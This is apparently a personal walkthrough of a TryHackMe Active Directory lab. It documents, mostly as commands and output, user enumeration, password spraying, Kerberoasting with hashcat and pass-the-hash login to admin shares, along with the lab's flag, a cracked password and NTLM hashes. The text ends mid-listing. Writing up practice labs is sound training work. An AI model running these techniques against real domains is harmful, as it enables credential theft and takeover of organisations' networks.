---
title: soupedecode01 Walkthrough
date: 2026-03-05
tags:
  - technology
  - tryhackme
  - boot-to-root
---
# Killchain
## 1. Get the domain components of the controller via `nmap -sV` or `enum4linux-ng`.
`#Reconnaissance`
- **Active Scanning (T1595)**
- **Gather Victim Network Information (T1590)**
## 2. Get a list of valid users via `kerbrute` and a username list.
`#Reconnaissance`
- **Gather Victim Identity Information (T1589)**
## 3. Discover a passwordless account for SMB with access to IPC$.
`#Delivery / Initial Access`
- **Valid Accounts (T1078)**

## 4. Use `nxc smb` to brute force rid users.
`#Delivery / Initial Access` `#Reconnaissance`
- **Brute Force (T1110)**

## 5. Discover an rid account using the same password as their username by using `nxc smb`.
`#Delivery` `#Exploitation`
- **Valid Accounts (T1078)**

## 6. Retrieve the user flag from the user's desktop in an smb share.
`#Actions on Objectives`
- **Data from Network Share (T1039)**

## 7. Collect SPN (uSer Principle Name) Hashes using `impacket-GetUserSPNs` and crack via `hashcat -m 13100` or `john`.
`#Exploitation`
- **Kerberoasting (T1558.003)**

## 8. Use the cracked credentials to collect a file with NTLM hashes from an smb share.
`#Reconnaissance`
- **OS Credential Dumping (T1003)**
- **Remote Services (T1021.002)**

## 9. Login to a valid user with a pass-the-hash via `smbclient`.
`#Lateral Movement`
- **Pass the Hash (T1550.002)**
- **Remote Services (T1021.002)**

## 10. Retrieve the root flag from the admin's desktop in an smb share.
`#Actions on Objectives`
- **Data from Network Share (T1039)**

---
# Lessons Learnt
- Always include the domain names in your /etc/hosts file for domain controllers.
- Don't forget to try an empty password.
- Use `nxc` instead of `netexec`.

---
# Nmap
`$sudo nmap -A 10.49.162.32 -oG nmap.txt -v`
- SOUPDECODE
- `DC01.SOUPEDECODE.LOCAL`
- `SOUPEDECODE.LOCAL`
- `DC=SOUPEDECODE,DC=LOCAL`
- Windows Server 2022 (89%)
- 53 Domain
- 88 Kerberos-sec
- 135 msrpc
- 139 netbios-ssn
- 389 ldap
- 445 microsoft-ds?
- 465 kpasswd5?
- 593 ncacn_http
- 636 tcpwrapped
- 3389 ms-wbt-server
# enum4linux-ng
```
$enum4linux-ng -A 10.49.162.32 -oA enum4linux.txt
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.49.162.32
[*] Username ......... ''
[*] Random Username .. 'kapbmqrv'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.49.162.32    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.49.162.32    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: SOUPEDECODE.LOCAL

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.49.162.32    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.49.162.32    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ===========================================================
|    Domain Information via SMB session for 10.49.162.32    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
Derived membership: domain member
Derived domain: SOUPEDECODE

 =========================================
|    RPC Session Check on 10.49.162.32    |
 =========================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[+] Server allows session using username 'kapbmqrv', password ''
[H] Rerunning enumeration with user 'kapbmqrv' might give more results

 ===============================================
|    OS Information via RPC for 10.49.162.32    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests, sessions are possible, but not with the provided credentials (see session check results)

Completed after 13.19 seconds
```

# kerbrute
```
$kerbrute userenum --dc 10.49.162.32 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/05/26 - Ronnie Flathers @ropnop

2026/03/05 14:32:16 >  Using KDC(s):
2026/03/05 14:32:16 >  	10.49.162.32:88

2026/03/05 14:32:30 >  [+] VALID USERNAME:	 aDMIN@SOUPEDECODE.LOCAL
2026/03/05 14:32:30 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:30 >  [+] VALID USERNAME:	 Admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:30 >  [+] VALID USERNAME:	 ADMIN@SOUPEDECODE.LOCAL
2026/03/05 14:32:31 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:31 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:31 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:31 >  [+] VALID USERNAME:	 administrator@SOUPEDECODE.LOCAL
2026/03/05 14:32:31 >  [+] VALID USERNAME:	 Administrator@SOUPEDECODE.LOCAL
2026/03/05 14:32:31 >  [+] VALID USERNAME:	 ADMINISTRATOR@SOUPEDECODE.LOCAL
2026/03/05 14:32:32 >  [+] VALID USERNAME:	 administrator@SOUPEDECODE.LOCAL
2026/03/05 14:32:32 >  [+] VALID USERNAME:	 administrator@SOUPEDECODE.LOCAL
2026/03/05 14:32:32 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:32 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:32 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:32:32 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2026/03/05 14:34:08 >  [+] VALID USERNAME:	 charlie@SOUPEDECODE.LOCAL
2026/03/05 14:35:16 >  [+] VALID USERNAME:	 fileserver@SOUPEDECODE.LOCAL
2026/03/05 14:35:40 >  [+] VALID USERNAME:	 Guest@SOUPEDECODE.LOCAL
2026/03/05 14:35:40 >  [+] VALID USERNAME:	 guest@SOUPEDECODE.LOCAL
2026/03/05 14:35:40 >  [+] VALID USERNAME:	 GUEST@SOUPEDECODE.LOCAL
2026/03/05 14:35:41 >  [+] VALID USERNAME:	 guest@SOUPEDECODE.LOCAL
2026/03/05 14:35:41 >  [+] VALID USERNAME:	 guest@SOUPEDECODE.LOCAL
2026/03/05 14:37:16 >  [+] VALID USERNAME:	 mailserver@SOUPEDECODE.LOCAL
2026/03/05 14:38:35 >  [+] VALID USERNAME:	 printserver@SOUPEDECODE.LOCAL
2026/03/05 14:40:49 >  [+] VALID USERNAME:	 webserver@SOUPEDECODE.LOCAL
2026/03/05 14:41:19 >  Done! Tested 26324 usernames (26 valid) in 543.063 seconds
```

```
$cat kerbrute_users.txt 
admin
administrator
charlie
fileserver
guest
mailserver
printserver
webserver
```

# netexec
```
$netexec smb 10.49.162.32 -u kerbrute_users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
SMB         10.49.162.32    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.49.162.32    445    DC01             [-] SOUPEDECODE.LOCAL\admin:123456 STATUS_LOGON_FAILURE 
SMB         10.49.162.32    445    DC01             [-] SOUPEDECODE.LOCAL\administrator:123456 STATUS_LOGON_FAILURE 
SMB         10.49.162.32    445    DC01             [-] SOUPEDECODE.LOCAL\charlie:123456 STATUS_LOGON_FAILURE 
SMB         10.49.162.32    445    DC01             [+] SOUPEDECODE.LOCAL\fileserver:123456 (Guest)
```

==fileserver : Guest==
==mailserver : Guest==
==printserver : Guest==
==webserver : Guest==
==guest : ==

# smbclient
```
$smbclient -L //10.49.162.32 -U fileserver --password=Guest

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.162.32 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


Was stuck here. Anything I tried didn't work and the domain controller event crashed at one point, so I needed help. Turns out I was required to add the IP with the domains DC01.SOUPEDECODE.LOCAL and SOUPEDECODE.LOCAL in my etc hosts file.

# smbmap
```
$smbmap -u guest -H DC01.SOUPEDECODE.LOCAL

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.48.156.196:445	Name: DC01.SOUPEDECODE.LOCAL	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

That wasn't the end to my issues, I hit another road block immediately. I had to look up again to see what I was doing wrong, turns out for whatever reason, my two netexecs acted differently, so I should only use nxc from now on:
netexec:
```
$netexec --version
1.3.0 - NeedForSpeed -

$netexec smb DC01.SOUPEDECODE.LOCAL -u guest -p '' --rid-brute 2500
usage: nxc smb [-h] ...
nxc smb: error: argument -p/--password: expected at least one argument

$netexec smb DC01.SOUPEDECODE.LOCAL -u guest --rid-brute 2500
SMB         10.48.156.196   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.48.156.196   445    DC01             [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
nxc:
```
$nxc --version
1.3.0 - NeedForSpeed -

$nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute 2500
SMB         10.48.156.196   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.48.156.196   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.48.156.196   445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.48.156.196   445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.48.156.196   445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
...
```

```
$cat nxc_users.txt 
aaaron589
aadam701
abianca784
acarl237
acarl386
adelia337
admin
afiona845
...
```

# nxc password spraying
```
$nxc smb DC01.SOUPEDECODE.LOCAL -u nxc_users.txt -p /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt
SMB         10.48.156.196   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\aaaron589:123456 STATUS_LOGON_FAILURE 
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\aadam701:123456 STATUS_LOGON_FAILURE
...
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\zzach427:123456 STATUS_LOGON_FAILURE
^C
```

```
$nxc smb DC01.SOUPEDECODE.LOCAL -u nxc_users.txt -p nxc_users.txt --no-bruteforce
SMB         10.48.156.196   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\aaaron589:aaaron589 STATUS_LOGON_FAILURE 
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\aadam701:aadam701 STATUS_LOGON_FAILURE 
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\abianca784:abianca784 STATUS_LOGON_FAILURE
...
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\xzach541:xzach541 STATUS_LOGON_FAILURE 
SMB         10.48.156.196   445    DC01             [-] SOUPEDECODE.LOCAL\yadam355:yadam355 STATUS_LOGON_FAILURE 
SMB         10.48.156.196   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

==ybob317 : ybob317==

# smbmap
```
$smbmap -u ybob317 -p ybob317 -H DC01.SOUPEDECODE.LOCAL

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.48.156.196:445	Name: DC01.SOUPEDECODE.LOCAL	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
[*] Closed 1 connections
```

# smbclient
```
$smbclient --user=ybob317 --password=ybob317 //DC01.SOUPEDECODE.LOCAL/Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul  5 08:48:22 2024
  ..                                DHS        0  Thu Mar  5 15:08:03 2026
  admin                               D        0  Fri Jul  5 08:49:01 2024
  Administrator                       D        0  Thu Mar  5 15:17:45 2026
  All Users                       DHSrn        0  Sat May  8 18:26:16 2021
  Default                           DHR        0  Sun Jun 16 12:51:08 2024
  Default User                    DHSrn        0  Sat May  8 18:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 18:14:03 2021
  Public                             DR        0  Sun Jun 16 03:54:32 2024
  ybob317                             D        0  Tue Jun 18 03:24:32 2024

		12942591 blocks of size 4096. 10802121 blocks available
smb: \> cd ybob317
smb: \ybob317\> ls
  .                                   D        0  Tue Jun 18 03:24:32 2024
  ..                                 DR        0  Fri Jul  5 08:48:22 2024
  3D Objects                         DR        0  Tue Jun 18 03:24:32 2024
  AppData                            DH        0  Tue Jun 18 03:24:30 2024
  Application Data                DHSrn        0  Tue Jun 18 03:24:30 2024
  Contacts                           DR        0  Tue Jun 18 03:24:32 2024
  Cookies                         DHSrn        0  Tue Jun 18 03:24:30 2024
  Desktop                            DR        0  Sat Jul 26 03:51:44 2025
  Documents                          DR        0  Tue Jun 18 03:24:32 2024
  Downloads                          DR        0  Tue Jun 18 03:24:32 2024
  Favorites                          DR        0  Tue Jun 18 03:24:32 2024
  Links                              DR        0  Tue Jun 18 03:24:32 2024
  Local Settings                  DHSrn        0  Tue Jun 18 03:24:30 2024
  Music                              DR        0  Tue Jun 18 03:24:32 2024
  My Documents                    DHSrn        0  Tue Jun 18 03:24:30 2024
  NetHood                         DHSrn        0  Tue Jun 18 03:24:30 2024
  NTUSER.DAT                        AHn   262144  Thu Mar  5 15:38:12 2026
  ntuser.dat.LOG1                   AHS    81920  Tue Jun 18 03:24:29 2024
  ntuser.dat.LOG2                   AHS        0  Tue Jun 18 03:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Tue Jun 18 03:24:54 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jun 18 03:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jun 18 03:24:29 2024
  ntuser.ini                        AHS       20  Tue Jun 18 03:24:30 2024
  Pictures                           DR        0  Tue Jun 18 03:24:32 2024
  Recent                          DHSrn        0  Tue Jun 18 03:24:30 2024
  Saved Games                        DR        0  Tue Jun 18 03:24:32 2024
  Searches                           DR        0  Tue Jun 18 03:24:32 2024
  SendTo                          DHSrn        0  Tue Jun 18 03:24:30 2024
  Start Menu                      DHSrn        0  Tue Jun 18 03:24:30 2024
  Templates                       DHSrn        0  Tue Jun 18 03:24:30 2024
  Videos                             DR        0  Tue Jun 18 03:24:32 2024

		12942591 blocks of size 4096. 10802121 blocks available
smb: \ybob317\> cd Desktop
smb: \ybob317\Desktop\> ls
  .                                  DR        0  Sat Jul 26 03:51:44 2025
  ..                                  D        0  Tue Jun 18 03:24:32 2024
  desktop.ini                       AHS      282  Tue Jun 18 03:24:32 2024
  user.txt                            A       33  Sat Jul 26 03:51:44 2025

		12942591 blocks of size 4096. 10802121 blocks available
smb: \ybob317\Desktop\> get user.txt
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

# User Flag
```
$cat user.txt 
28189316c25dd3c0ad56d44d000d62a8
```

# Impacket GetUserSPNs
```
$impacket-GetUserSPNs 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request -dc-ip SOUPEDECODE.LOCAL -outputfile hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-18 03:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-18 03:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-18 03:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-18 03:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-18 03:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
```

# Hashcat Cracking
```
$hashcat hashes.txt -m 13100 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 1437/2938 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$069ba2583874bb241eef4cd7fb3c4883$e9eb94089e427eebe5bb5a904c483544e762c923575a6363ebf50d332909d339986b0c409c9e1af42b67b334787d19e650844ea02e9b4491cd39c80607b3f66f39bc33f82be261267b71a97d3bf38b6602766803ea16a66056bd6bd1567eced546d76c8e4bddc461a65180be5ee897ef39e4cdd2d88ba7ba94f44beb3321d4e51b9f78738b9eb723e17f6f34674f289aefa6f2a73ee65a17606bf25c9899cbc80fde86a536f026fb46b1b91103f971e051421afc6432d69ef32dbcae96d3750b78601ea6122d63d967077529e96e45705e455d64dc6e04a626d88945cf6c60aa67a000ee4a2e8af85d22aa4687a52f729fe9e72aa2bb6f66d257e9ae6f35f0e3bcfe519350df691f61eebe6a4afeafd1dda24b84b3d7873931527e7804c41bf9f21877de7e11c2325f431c24afc244410fa7fe69613559ae30abd9c1142750e598d3f399f41658ff7dfc073ac2a4bff25b11be080a5e5cad0cbb18d305e1be666a5da4d7351288a612fd45393cd523e43335f70b74d1ad1756cc099a1ff13730e26883d6fdd10ca30a8a87cdd56eac0b3eebf916eb9064477eb77cafcdeb10358a344fa7178d92e5669df8954cecd7b4bce30ef5ef6bf8e89acb5cebb16b20a6ebe1e682f4b5721588f7a825d6eda64c6dd248e1cc9e1b5361fad6efc0675546abb3eb9c8b4c136527706cb1668ac0434bf1d936d297f5f2053bdb846c150de2b0db14c909fd3034f82aa2ec53828e815ec304901b8eef0ea47106793af2d1a096fb1d4b845e2f553eb294954399fab135552f8431255c367a06769d79c1e7e62e2593bd50c05a149e013422b09b9b12f0f3a76eefcff818ee06d86b50e04f9fe825b4857ab7b58a782e9d378697831eee735029d63e21af7da624504d4f1c743e1237c4131105c39bcc28e2646069c82a7b69aa717e42dc7ddb03ee597eb44e848fe11cfb9be735944bd64aa2256a5700c7177d55b519c8ddcfba82bab3cf01fa0cf45476eb35e2aae96ff04e653d11ac1a068505b47d3a75e2c826a75dc6607ccf8b075cf02c3a3c536c82865ca745f670e4961ac04463ebc736fa6112c1faa22634c54095626bfdaccea87b573fd3fced78076c50f233000c45127d4c7f6946f425a0583581edd47f86b2e787640d25ad15cca144c277e6ea4c6e2aa850e0ba7f5ebd3521d17d70e1e68015e0a4eb338bc4c75eba7f582878ca67efc667853857865658861ba910ec61c4d1bebd4b9d2c1ec52e69d622cd53cf36c4a48e53cb43ad8183caff7b4c18c7ecad27d6c5214b711308c2afe2b93bed84f1d3d2be81a6284d71093013b1f5425a9fdb1a96e972402e872da2fe435e5042b7bc4b87c591928e1300ce68115bae1c52f3b755cab7c45e03f74fe33132369028f3759af3157b5c070e1b3d83edf5a71eb6519ade33deab5b61809e64b58584d97a893dc132123cf8ad16644fbae580c3face64aba8b0c5cccfcbf5f908ebf9d936252708:Password123!!
```

==file_svc : Password123!!==

# smbmap file_svc
Remember to put the password in single quotes to escape the `!!`.
```
$smbmap -u file_svc -p 'Password123!!' -H DC01.SOUPEDECODE.LOCAL

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.48.156.196:445	Name: DC01.SOUPEDECODE.LOCAL	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```

# smbclient
```
$smbclient --user=file_svc --password='Password123!!' //DC01.SOUPEDECODE.LOCAL/backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun 18 03:41:17 2024
  ..                                 DR        0  Sat Jul 26 03:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 18:41:05 2024

		12942591 blocks of size 4096. 10802057 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
```

```
$cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

# smbmap Pass-The-Hash
```
$smbmap -u 'FileServer$' -p 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' -H SOUPEDECODE.LOCAL

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Unable to remove test file at \\10.48.156.196\SYSVOL\TXILYHJCSR.txt, please remove manually                              
                                                                                                                             
[+] IP: 10.48.156.196:445	Name: SOUPEDECODE.LOCAL   	Status: ADMIN!!!   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	backup                                            	NO ACCESS	
	C$                                                	READ, WRITE	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ, WRITE	Logon server share 
	SYSVOL                                            	READ, WRITE	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```

# smbclient Pass-The-Hash
```
$smbclient '//SOUPEDECODE.LOCAL/C$' --user='FileServer$' --pw-nt-hash e41da7e79a4c76dbd9cf79d1cb325559
Try "help" to get a list of possible commands.
smb: \> ls
  $WinREAgent                        DH        0  Sun Jun 16 05:19:51 2024
  badr                                D        0  Thu Mar  5 15:10:26 2026
  Documents and Settings          DHSrn        0  Sun Jun 16 12:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Thu Mar  5 15:07:01 2026
  pagefile.sys                      AHS 738197504  Thu Mar  5 15:07:01 2026
  PerfLogs                            D        0  Sat May  8 18:15:05 2021
  Program Files                      DR        0  Sun Jun 16 03:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 19:34:13 2021
  ProgramData                       DHn        0  Thu Aug  1 23:57:43 2024
  Recovery                         DHSn        0  Sun Jun 16 12:51:08 2024
  System Volume Information         DHS        0  Sun Jun 16 05:02:21 2024
  Users                              DR        0  Fri Jul  5 08:48:22 2024
  Windows                             D        0  Thu Mar  5 17:29:01 2026

		12942591 blocks of size 4096. 10801783 blocks available
smb: \> cd Users
lsmb: \Users\> ls
